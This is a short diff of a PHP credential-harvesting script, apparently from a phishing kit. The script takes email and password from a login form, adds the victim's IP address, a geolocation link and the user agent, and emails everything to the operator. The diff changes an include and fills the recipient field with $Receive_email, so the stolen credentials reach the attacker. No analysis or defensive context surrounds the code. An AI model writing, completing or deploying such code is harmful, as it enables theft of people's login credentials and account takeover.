@@ -1,5 +1,5 @@
 <?php
-include 'email.php';
+include 'api.php';
 $email = trim($_POST['email']);
 $password = trim($_POST['password']);
 if($email != null && $password != null){
@@ -15,7 +15,7 @@ if($email != null && $password != null){
 	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
 	$message .= "User Agent : ".$useragent."\n";
 	$message .= "|----------- ArkealoGeNDz --------------|\n";
-	$send = "";
+	$send = $Receive_email;
 	$subject = "Login : $ip";
 	$headers = 'From: executive@foneunits.com'       . "\r\n" .
                  'Reply-To: executive@foneunits.com' . "\r\n" .
